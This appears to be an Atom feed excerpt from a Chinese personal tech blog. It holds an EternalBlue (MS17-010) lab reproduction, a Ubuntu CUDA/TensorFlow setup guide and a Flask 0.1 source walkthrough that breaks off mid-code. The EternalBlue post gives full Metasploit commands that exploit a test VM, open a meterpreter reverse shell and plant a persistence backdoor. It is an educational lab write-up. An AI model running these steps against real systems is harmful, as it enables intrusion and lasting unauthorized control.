&lt;p&gt;在王爽的《汇编语言》最后，有关于Intel微处理器的三种工作模式的介绍。&lt;/p&gt;
&lt;p&gt;继Intel 808
      
    
    </summary>
    
      <category term="汇编" scheme="https://mingliangliu.com/categories/%E6%B1%87%E7%BC%96/"/>
    
    
      <category term="汇编" scheme="https://mingliangliu.com/tags/%E6%B1%87%E7%BC%96/"/>
    
      <category term="保护模式" scheme="https://mingliangliu.com/tags/%E4%BF%9D%E6%8A%A4%E6%A8%A1%E5%BC%8F/"/>
    
  </entry>
  
  <entry>
    <title>永恒之蓝漏洞复现</title>
    <link href="https://mingliangliu.com/posts/fdea9fc4/"/>
    <id>https://mingliangliu.com/posts/fdea9fc4/</id>
    <published>2019-08-04T09:07:47.000Z</published>
    <updated>2020-02-15T06:45:50.785Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>永恒之蓝是美国国家安全局开发的漏洞利用程序，该工具利用445/TCP端口的文件分享协议的漏洞进行传播。尽管微软与17年3月份就发布了该漏洞的补丁，然而并没有引起多大的重视，直到17年5月12日WannaCry勒索病毒爆发时，很多用户因未安装补丁而受害。</p><h2 id="基本环境"><a href="#基本环境" class="headerlink" title="基本环境"></a>基本环境</h2><ul><li>Kali Linux (IP: 192.168.190.135)</li><li>Metasploit工具</li><li>靶机，MSDN下载的win7  (IP: 192.168.190.136)</li></ul><p>win7中开启文件共享</p><h2 id="漏洞探测"><a href="#漏洞探测" class="headerlink" title="漏洞探测"></a>漏洞探测</h2><p>先启动msfconsole，输入如下指令：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">msf5 &gt; use auxiliary/scanner/smb/smb_ms17_010 </span><br><span class="line">msf5 auxiliary(scanner/smb/smb_ms17_010) &gt; <span class="built_in">set</span> RHOSTS 192.168.190.136</span><br><span class="line">RHOSTS =&gt; 192.168.190.136</span><br><span class="line">msf5 auxiliary(scanner/smb/smb_ms17_010) &gt; run</span><br><span class="line"></span><br><span class="line">[+] 192.168.190.136:445   - Host is likely VULNERABLE to MS17-010! - Windows 7 Home Basic 7600 x64 (64-bit)</span><br><span class="line">[*] 192.168.190.136:445   - Scanned 1 of 1 hosts (100% complete)</span><br><span class="line">[*] Auxiliary module execution completed</span><br></pre></td></tr></table></figure><p>从上述结果可知：该win7存在漏洞</p><h2 id="开始攻击"><a href="#开始攻击" class="headerlink" title="开始攻击"></a>开始攻击</h2><p>执行如下指令：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">msf5 auxiliary(scanner/smb/smb_ms17_010) &gt; use exploit/windows/smb/ms17_010_eternalblue</span><br><span class="line">msf5 exploit(windows/smb/ms17_010_eternalblue) &gt; <span class="built_in">set</span> LHOST 192.168.190.135</span><br><span class="line">LHOST =&gt; 192.168.190.135</span><br><span class="line">msf5 exploit(windows/smb/ms17_010_eternalblue) &gt; <span class="built_in">set</span> LPORT 4444</span><br><span class="line">LPORT =&gt; 4444</span><br><span class="line">msf5 exploit(windows/smb/ms17_010_eternalblue) &gt; <span class="built_in">set</span> payload windows/x64/meterpreter/reverse_tcp</span><br><span class="line">payload =&gt; windows/x64/meterpreter/reverse_tcp</span><br><span class="line">msf5 exploit(windows/smb/ms17_010_eternalblue) &gt; <span class="built_in">set</span> RHOSTS 192.168.190.136</span><br><span class="line">RHOSTS =&gt; 192.168.190.136</span><br><span class="line">msf5 exploit(windows/smb/ms17_010_eternalblue) &gt; run</span><br></pre></td></tr></table></figure><p>第一行指令意思是加载Metasploit中的EternalBlue攻击模块，第四行是设置shell的通信类型，payload中装载的是漏洞利用成功后在目标机器上执行的代码</p><p>结果如下：</p><img src="/images/永恒之蓝漏洞复现1.PNG"><p>执行一下<code>shell</code>指令：</p><img src="/images/永恒之蓝漏洞复现2.PNG"><p>可以看到，我们已获得目标机器的最高权限的shell</p><h2 id="权限维持"><a href="#权限维持" class="headerlink" title="权限维持"></a>权限维持</h2><p>metasploit自带的留后门方式有两种：metsvc和persistence，但都有弊端，官方都不推荐使用，这里使用persistence试下</p><p>执行如下指令即可在目标机器中留一个后门：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; run persistence -U -i 10 -p 4444 -r 192.168.190.135</span><br></pre></td></tr></table></figure><p>其中：</p><ul><li>-U：设置后门在用户登录后自启动。</li><li>-i：设置反向连接间隔时间，单位为秒。</li><li>-p：设置反向连接的端口号。</li><li>-r：设置反向连接的ip地址。</li></ul><p>之后可以使用handler模块进行连接</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">msf5 &gt; use exploit/multi/handler </span><br><span class="line">msf5 exploit(multi/handler) &gt; set LHOST 192.168.190.135</span><br><span class="line">LHOST =&gt; 192.168.190.135</span><br><span class="line">msf5 exploit(multi/handler) &gt; exploit</span><br></pre></td></tr></table></figure><hr><p>完</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;永恒之蓝是美国国家安全局开发的漏洞利用程序，该工具利用445/TCP端口的文件分享协议的漏洞进行传播。尽管微软与17年3月份就发布了该漏洞的
      
    
    </summary>
    
      <category term="信息安全" scheme="https://mingliangliu.com/categories/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="信息安全" scheme="https://mingliangliu.com/tags/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>Ubuntu双系统搭建GPU机器学习环境</title>
    <link href="https://mingliangliu.com/posts/f45776a1/"/>
    <id>https://mingliangliu.com/posts/f45776a1/</id>
    <published>2019-04-24T15:12:07.000Z</published>
    <updated>2020-02-15T06:45:50.782Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>本篇更新于2019-11-29</p><p>最近无奈重装了电脑，原来构建好的环境也没了，又要折腾一阵。但是时过境迁，这篇所写的一些方法却不好使了。无奈只好重新Google摸索。</p><p>更新主要有一下几点：</p><ul><li>更换了所使用的Ubuntu镜像，使用Ubuntu_18.04.3</li><li>改变了制作镜像的方法</li><li>改变了解决安装Ubuntu时卡死的方法，原来的方法不好用了，可能跟镜像版本有关</li><li>使用了更高版本的Nvidia驱动</li><li>对于CUDA和cuDNN的安装方法并没有更新，但是其安装方法并不会变化太大</li><li>由于Tensorflow已经更新到2.0版本，建议使用新版本的Tensorflow，最后验证环境安装成功的方法也是基于Tensorflow2.0</li></ul><p>以下是修改后的原文：</p><p>本篇写于2019-4-25</p><p>这两天装Ubuntu18.04双系统简直装到崩溃。一是非常著名的开机卡死在Logo界面的问题，另一个是在装Nvidia驱动和CUDA的时候，更是费心。而网上的资料又良莠不齐，走了不少弯路。于是做个总结，方便以后的自己，也方便别人。</p><p>首先：我的机器是戴尔灵越5577，以下方案不一定适合您的机器，操作失败还请自行百度解决，并且安装所CUDA和cuDNN版本请务必参照<a href="https://tensorflow.google.cn/install/source" target="_blank" rel="noopener">官网配置</a></p><h2 id="装机"><a href="#装机" class="headerlink" title="装机"></a>装机</h2><p>镜像是在Ububtu官网下载的镜像，这没有什么异议。启动盘制作方面我选择<a href="https://rufus.ie/" target="_blank" rel="noopener">rufus</a>，小巧免费好用，并且非常适合制作Linux启动盘。</p><p>选好U盘选好镜像后就可以制作了，制作启动盘的选项如下：</p><img src="/images/rufus_en.png"><p>制作完成后，关闭rufus就可以了，带着U盘，重新启动。</p><p>进入U盘引导（不同品牌的电脑有不同的方式，Dell是按F12选择启动方式），进入grub界面。</p><p>为防止开机开在Logo，选中Install Ubuntu，然后按e编辑。在<code>splash</code>后面加上<code>acpi=off</code>，注意前后留一个空格。然后按F10即可正常安装启动了。关于<code>acpi=off</code>具体含义，可以参考<a href="https://askubuntu.com/questions/139157/booting-ubuntu-with-acpi-off-grub-parameter" target="_blank" rel="noopener">这里</a></p><p>我的分区方式如下，共分给Linux 20G：</p><table><thead><tr><th align="center">目录</th><th align="center">大小</th><th align="center"></th></tr></thead><tbody><tr><td align="center">/</td><td align="center">19G</td><td align="center">主分区</td></tr><tr><td align="center">swap</td><td align="center">1G</td><td align="center">主分区</td></tr></tbody></table><p>装完后，会显示重新启动，点击重新启动后，我还是在这里卡住了。按住电源键不放，强制关机后。再开机后却没有问题了。</p><p>但是有的博主也说这个方法会使得装好后的Ubuntu出现诸如键盘灯不亮，触摸板不能用的情况，还要再在grub的配置里把<code>acpi=off</code>去除，但是当我准备去去除的时候却发现grub的配置并没有<code>acpi=off</code>的配置，所以便跳过了这一步。如果你的电脑出现此类情况的话请参考<a href="https://blog.csdn.net/qwqw3qee/article/details/90499038" target="_blank" rel="noopener">这里</a></p><h2 id="安装驱动"><a href="#安装驱动" class="headerlink" title="安装驱动"></a>安装驱动</h2><p>这里有很多教程说是通过<code>sudo ubuntu-drivers autoinstall</code>这个方法安装的，但是就我亲身经历而言，并不好使，这里安装驱动是没问题的，但是后来在安装CUDA的时候会遇到各种各样的问题。</p><p>这里的建议是，去Nvidia的官网选择一个适合你的显卡的驱动（我选的最新的），下载好备用。</p><p>在装驱动之前，先将nouveau加入黑名单：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo vim /etc/modprobe.d/blacklist.conf</span><br></pre></td></tr></table></figure><p>在末尾加上一行<code>blacklist nouveau</code>，保存退出并<strong>重启</strong>。</p><p>接下来按CTRL+ALT+F2，进入纯字符界面，以root身份登入，开始安装显卡驱动。首先进入刚才下好的驱动所在的目录，执行</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">chmod 777 ./NVIDIA-Linux-x86_64-xxx.xx.run</span><br><span class="line">./NVIDIA-Linux-x86_64-xxx.xx.run –no-opengl-files <span class="comment"># 后面的参数可选</span></span><br></pre></td></tr></table></figure><blockquote><p>对于第二行的<code>–no-opengl-files</code>参数可选，有的博主遇到安装驱动后在登陆界面循环登录的情况，加了该参数后解决，但是我并没有加也没有问题，可能是新版本的驱动已经解决了这个问题</p></blockquote><p>然后一路确定，完成后重启系统，进入BIOS（戴尔是按F2，其他电脑型号请自行查找资料），<strong>关掉secure boot，设置为disable</strong>，关掉后保存重启。这里<strong>一定要关掉</strong>，不然开机后是没法用刚才装的Nvidia驱动的。</p><p>启动后在控制台输入<code>nvidia-smi</code>，若没有报错则证明安装成功。我安装完后如下：</p><img src="/images/机器学习环境搭建1.png"><h2 id="安装CUDA"><a href="#安装CUDA" class="headerlink" title="安装CUDA"></a>安装CUDA</h2><p>接下来，我们安装CUDA，我这里使用的是CUDA10.0，因为目前tensorflow已经可以使用CUDA10了，也就不挑旧版本安装了。</p><p>到Nvidia官网上找到CUDA10.0的下载链接，Nvidia给出的默认的CUDA的下载链接是CUDA10.1，因为我没试验过，所以不知道可不可以用，你可以自行决定。</p><p>依次选择 Linux -&gt; x86_64 -&gt; Ubuntu -&gt; 18.04 -&gt; runfile(local)，选好后选择Base Install开始下载。</p><p>下好后，找到CUDA安装包所在的位置，在控制台输入</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo sh ./cuda_10.0.130_410.48_linux.run</span><br></pre></td></tr></table></figure><p>然后等待一会后，会出来安装协议，按住空格键快速看完。然后选择安装选项：</p><ul><li>第一项，选择accept接受。</li><li>第二项，询问你是否安装CUDA中带的显卡驱动，由于我们前面已经安装了驱动，所以不安装，选n</li><li>剩下的，能选y的选y，能Enter的Enter就好。</li></ul><p>装好后，在~/.bashrc最后 添加环境变量，保存后退出</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">export</span> LD_LIBRARY_PATH=<span class="variable">$LD_LIBRARY_PATH</span>:/usr/<span class="built_in">local</span>/cuda-10.0/lib64</span><br><span class="line"><span class="built_in">export</span> PATH=<span class="variable">$PATH</span>:/usr/<span class="built_in">local</span>/cuda-10.0/bin</span><br><span class="line"><span class="built_in">export</span> CUDA_HOME=<span class="variable">$CUDA_HOME</span>:/usr/<span class="built_in">local</span>/cuda-10.0</span><br></pre></td></tr></table></figure><p>测试一下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> /usr/<span class="built_in">local</span>/cuda/samples/1_Utilities/deviceQuery </span><br><span class="line">sudo make</span><br><span class="line">./deviceQuery</span><br></pre></td></tr></table></figure><p>若最后一行的结果为<code>Result = PASS</code>，说明安装成功。</p><h2 id="安装cuDNN"><a href="#安装cuDNN" class="headerlink" title="安装cuDNN"></a>安装cuDNN</h2><p>最后，去官网找对应版本的cuDNN，这里我选择的是7.5（7.4也是可以的），下载（这里需要登陆Nvidia才可以）</p><p>将下载好的压缩包解压，一般解压出来的目录为cuda，拷贝到CUDA中</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo cp cuda/include/cudnn.h /usr/<span class="built_in">local</span>/cuda/include/ </span><br><span class="line">sudo cp cuda/lib64/libcudnn* /usr/<span class="built_in">local</span>/cuda/lib64/</span><br></pre></td></tr></table></figure><h2 id="最后"><a href="#最后" class="headerlink" title="最后"></a>最后</h2><p>至此，CUDA已安装完成，装个gpu版本的tensorflow试试（你也可以先使用virtualenv创建个虚拟环境再安装）</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip3 install tensorflow-gpu  <span class="comment"># 这里pip3需要手动下载，并且默认装TensorFlow2.0</span></span><br></pre></td></tr></table></figure><p>装好后，进入python交互环境</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">import</span> tensorflow <span class="keyword">as</span> tf</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>tf.test.is_gpu_available()</span><br></pre></td></tr></table></figure><p>执行后，会有日志打印，若最后显示<code>True</code>，即证明安装成功。</p><hr><p>参考：</p><ul><li><a href="https://blog.csdn.net/qq_32408773/article/details/84111244" target="_blank" rel="noopener">https://blog.csdn.net/qq_32408773/article/details/84111244</a></li><li><a href="https://blog.csdn.net/u010801439/article/details/80483036" target="_blank" rel="noopener">https://blog.csdn.net/u010801439/article/details/80483036</a></li><li><a href="https://www.jianshu.com/p/6f54b4f96556" target="_blank" rel="noopener">https://www.jianshu.com/p/6f54b4f96556</a></li><li><a href="https://blog.csdn.net/qwqw3qee/article/details/90499038" target="_blank" rel="noopener">https://blog.csdn.net/qwqw3qee/article/details/90499038</a></li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;本篇更新于2019-11-29&lt;/p&gt;
&lt;p&gt;最近无奈重装了电脑，原来构建好的环境也没了，又要折腾一阵。但是时过境迁，这篇所写的一些方法却不
      
    
    </summary>
    
      <category term="机器学习" scheme="https://mingliangliu.com/categories/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0/"/>
    
    
      <category term="Linux" scheme="https://mingliangliu.com/tags/Linux/"/>
    
      <category term="机器学习" scheme="https://mingliangliu.com/tags/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0/"/>
    
  </entry>
  
  <entry>
    <title>Flask源码浅析</title>
    <link href="https://mingliangliu.com/posts/584c5358/"/>
    <id>https://mingliangliu.com/posts/584c5358/</id>
    <published>2019-04-19T15:38:55.000Z</published>
    <updated>2020-02-15T06:45:50.757Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>学习一样东西，要先知其然，然后知其所以然。</p><p>这次，我们看看Flask Web框架的源码。我会以Flask 0.1的源码为例，把重点放在Flask如何处理请求上，看一看从一个请求到来到返回响应都经过了什么过程。</p><p>你可能会问，为什么以Flask 0.1为例啊，那都是好几年前的一坨老代码了？老，并不代表没有用。相反，Flask 0.1的源码设计极为精妙，包含了Flask的主干部分，整个项目只有一个文件，六百行左右，分析起来也简单，有利于我们了解整个Flask的脉络。你可以从<a href="https://github.com/pallets/flask/tree/0.1" target="_blank" rel="noopener">这里</a>来获取Flask 0.1的源码。</p><h2 id="Flask中定义的几个的类和函数"><a href="#Flask中定义的几个的类和函数" class="headerlink" title="Flask中定义的几个的类和函数"></a>Flask中定义的几个的类和函数</h2><p>在Flask 0.1的源码中，一共定义了五个类：</p><ol><li><code>Request</code>和<code>Response</code>, 它们分别是Flask的请求和响应对象，分别继承自Werkzeug中的请求和响应类</li><li><code>_RequestContext</code>，请求上下文类。它包含了所有请求的相关信息。包括程序实例app，url匹配器，请求对象，session对象，g对象以及用于记录闪现的消息的<code>flashes</code></li><li><code>_RequestGlobals</code>，使用该类创建g对象，这个对象内没有任何的属性，你可以给该类的实例（即g）绑定任何的全局属性。</li><li><code>Flask</code>，它是整个Flask框架的中心类，它实现了WSGI程序用于处理请求和响应，并且，它是整个所有视图函数、模板配置、URL规则的中心注册处。</li></ol><p>另外，Flask中还定义了一些函数：如<code>render_template</code>、 <code>url_for</code>、<code>flash</code>、<code>get_flashed_messages</code>等，相信大家都知道这些函数的作用，我就不在赘述。下面我们着重看看<code>Flask</code>类。</p><h2 id="Flask中本地上下文"><a href="#Flask中本地上下文" class="headerlink" title="Flask中本地上下文"></a>Flask中本地上下文</h2><p>在flask.py文件的最后，定义了几个全局对象：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">_request_ctx_stack = LocalStack()</span><br><span class="line">current_app = LocalProxy(<span class="keyword">lambda</span>: _request_ctx_stack.top.app)</span><br><span class="line">request = LocalProxy(<span class="keyword">lambda</span>: _request_ctx_stack.top.request)</span><br><span class="line">session = LocalProxy(<span class="keyword">lambda</span>: _request_ctx_stack.top.session)</span><br><span class="line">g = LocalProxy(<span class="keyword">lambda</span>: _request_ctx_stack.top.g)</span><br></pre></td></tr></table></figure><p>其中，<code>_request_ctx_stack</code>是Flask的请求上下文堆栈，它的栈顶即是当前请求上下文对象的实例，当一个请求到来时，Flask会将一个请求上下文对象推入这个堆栈以便在程序中使用。<code>current_app</code>、<code>request</code>、<code>session</code>和<code>g</code>通过代理的方式从上下文堆栈中获取到所需要的值。如果你还不清楚<code>LocalStack</code>和<code>LocalProxy</code>，可以参见<a href="/2019/04/09/什么是Werkzeug/#more">什么时Werkzeug</a></p><h2 id="Flask类"><a href="#Flask类" class="headerlink" title="Flask类"></a>Flask类</h2><p>下面，我们重点看一下Flask类是如何定义的。</p><h3 id="从Flask类开头和-init-看起"><a href="#从Flask类开头和-init-看起" class="headerlink" title="从Flask类开头和__init__看起"></a>从Flask类开头和<code>__init__</code>看起</h3><p>在开始处，我们会看到Flask将<code>Request</code>和<code>Response</code>分别赋值给了<code>request_class</code>和<code>response_class</code>.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">request_class = Request</span><br><span class="line">response_class = Response</span><br></pre></td></tr></table></figure><p>Flask并没有在程序中直接使用<code>Request</code>和<code>Response</code>来生成请求和响应对象，而是通过调用<code>request_class</code>和<code>response_class</code>来生成，这就给我们自定义请求和响应类提供了方便。你可以通过继承Flask中的请求和响应类来构建自己的请求和响应类，并将它们赋值给<code>request_class</code>和<code>response_class</code>即可。</p><p>在下面：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">static_path = <span class="string">'/static'</span></span><br><span class="line">secret_key = <span class="keyword">None</span></span><br><span class="line">session_cookie_name = <span class="string">'session'</span></span><br></pre></td></tr></table></figure><p>我们可以看到在这里Flask定义了静态资源的目录，密钥以及cookie的名称，当然，这些你也可以手动进行修改。</p><p>下面，我们看一看<code>__init__</code>：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, package_name)</span>:</span></span><br><span class="line">    self.debug = <span class="keyword">False</span>  <span class="comment"># 是否开启调试</span></span><br><span class="line"></span><br><span class="line">    self.package_name = package_name</span><br><span class="line"></span><br><span class="line">    self.root_path = _get_package_path(self.package_name)  <span class="comment"># 程序的根目录</span></span><br><span class="line"></span><br><span class="line">    self.view_functions = &#123;&#125;  <span class="comment"># 用于保存注册的视图函数</span></span><br><span class="line"></span><br><span class="line">    self.error_handlers = &#123;&#125;  <span class="comment"># 保存注册的错误处理函数</span></span><br><span class="line"></span><br><span class="line">    self.before_request_funcs = []  <span class="comment"># 保存请求开始时前调用的函数</span></span><br><span class="line"></span><br><span class="line">    self.after_request_funcs = []  <span class="comment"># 保存请求完成后调用的函数</span></span><br><span class="line"></span><br><span class="line">    self.url_map = Map()  <span class="comment"># 保存路由规则</span></span><br></pre></td></tr></table></figure><p>可以看到，我们用字典来保存注册的视图函数和错误处理函数，以及用列表保存请求前后要掉用的函数。其中用一个<code>Map</code>对象<code>url_map</code>来保存我们对URL进行处理的路由规则，其中每个路由规则为一个<code>Rule</code>对象，我们会在下文看到。另外，<code>__init__</code>中还定义的用于保存模板函数的属性，以及Jinja2环境对象，这里不在一一列出。</p><h3 id="用于注册视图函数的装饰器"><a href="#用于注册视图函数的装饰器" class="headerlink" title="用于注册视图函数的装饰器"></a>用于注册视图函数的装饰器</h3><p>众所周知，我们可以使用下面的方式来注册视图函数：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@app.route('/')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">'Hello World'</span></span><br></pre></td></tr></table></figure><p>我们看一下这个装饰器是如何实现的：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">route</span><span class="params">(self, rule, **options)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">decorator</span><span class="params">(f)</span>:</span></span><br><span class="line">        self.add_url_rule(rule, f.__name__, **options)</span><br><span class="line">        self.view_functions[f.__name__] = f</span><br><span class="line">        <span class="keyword">return</span> f</span><br><span class="line">    <span class="keyword">return</span> decorator</span><br></pre></td></tr></table></figure><p>在<code>route</code>中，会对我们传入的视图函数进行包装，首先调用Flask中的<code>add_url_rule</code>方法，然后以函数名为键，将视图函数保存在<code>__init__</code>中定义的用于保存视图函数的<code>view_functions</code>字典中。</p><p>下面，我们看看在<code>add_url_rule(rule, f.__name__, **options)</code>内部发生了什么：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add_url_rule</span><span class="params">(self, rule, endpoint, **options)</span>:</span></span><br><span class="line">    options[<span class="string">'endpoint'</span>] = endpoint</span><br><span class="line">    options.setdefault(<span class="string">'methods'</span>, (<span class="string">'GET'</span>,))  <span class="comment">#  默认监听GET方法</span></span><br><span class="line">    self.url_map.add(Rule(rule, **options))</span><br></pre></td></tr></table></figure><p>在<code>add_url_rule</code>中，Flask首先将以<code>&#39;endpoint&#39;</code>为键，将端点值放入<code>options</code>中。如果<code>options</code>没有<code>&#39;methods&#39;</code>键，Flask会在这里给我们添加一个默认的GET方法，也就是说，当我们直接使用<code>@app.route(&#39;/&#39;)</code>，而不传入监听的方法时，Flask会默认监听GET方法。最后，Flask以当前的<code>rule</code>和<code>options</code>创建一个<code>Rule</code>对象放入到<code>url_map</code>中，为我们的程序新增了一条路由规则。</p><p>另外，除了<code>route</code>装饰器外，Flask中还有还提供了用于注册错误函数、请求前调用的函数、请求后调用的函数等的装饰器，这些装饰器和<code>route</code>装饰器基本相同，只是没有添加路由规则这个功能。例如请求处理前调用的函数的的装饰器:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">before_request</span><span class="params">(self, f)</span>:</span></span><br><span class="line">    self.before_request_funcs.append(f)</span><br><span class="line">    <span class="keyword">return</span> f</span><br></pre></td></tr></table></figure><h2 id="Flask请求响应流程"><a href="#Flask请求响应流程" class="headerlink" title="Flask请求响应流程"></a>Flask请求响应流程</h2><p>Flask中定义了<code>wsgi_app(self, environ, start_response)</code>方法作为WSGI的程序，它并没有写死在<code>__call__</code>方法中，因此可以为其添加中间件。当请求到来时，WSGI服务器会调用此方法，并将请求的参数和用于发起响应的函数作为参数传递给它。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">wsgi_app</span><span class="params">(self, environ, start_response)</span>:</span></span><br><span class="line">    <span class="keyword">with</span> self.request_context(environ):</span><br><span class="line">        rv = self.preprocess_request()  <span class="comment"># 预处理请求</span></span><br><span class="line">        <span class="keyword">if</span> rv <span class="keyword">is</span> <span class="keyword">None</span>:</span><br><span class="line">            rv = self.dispatch_request()  <span class="comment"># 请求分发</span></span><br><span class="line">        response = self.make_response(rv)  <span class="comment"># 生成响应</span></span><br><span class="line">        response = self.process_response(response)  <span class="comment"># 响应处理</span></span><br><span class="line">        <span class="keyword">return</span> response(environ, start_response)</span><br></pre></td></tr></table></figure><p>Flask在<code>with</code>语句下执行相关操作，这会触发<code>_RequestContext</code>中的<code>__enter__</code>方法，从而推送请求上下文到堆栈中。在<code>with</code>中，Flask先通过<code>preprocess_request()</code>预处理请求，在<code>preprocess_request()</code>中调用所有在<code>beforce_request()</code>装饰器中注册的<strong>请求前要调用的函数</strong>。随后，Flask使用<code>dispatch_request()</code>来进行请求分发，获得视图函数的返回值或是错误处理器的返回值。然后Falsk将请求分发时获得的返回值传给<code>make_response()</code>方法来生成一个响应对象，接下来，Flask在<code>process_response()</code>方法中调用所有在<code>after_request()</code>装饰器中注册的<strong>请求完成后要调用的函数</strong>。最后，通过<code>response</code>来发起一个响应，这会自动调用<code>start_response</code>方法来发起响应并将响应的值返回给WSGI服务器。</p><h3 id="预处理请求"><a href="#预处理请求" class="headerlink" title="预处理请求"></a>预处理请求</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">preprocess_request</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">for</span> func <span class="keyword">in</span> self.before_request_funcs:</span><br><span class="line">            rv = func()</span><br><span class="line">            <span class="keyword">if</span> rv <span class="keyword">is</span> <span class="keyword">not</span> <span class="keyword">None</span>:</span><br><span class="line">                <span class="keyword">return</span> rv</span><br></pre></td></tr></table></figure><p>上面的函数会在实际的请求分发之前调用，而且将会调用每一个使用<code>before_request()</code>装饰的函数。如果其中某一个函数返回一个值，这个值将会作为视图返回值处理并停止进一步的请求处理。</p><h3 id="请求分发"><a href="#请求分发" class="headerlink" title="请求分发"></a>请求分发</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span 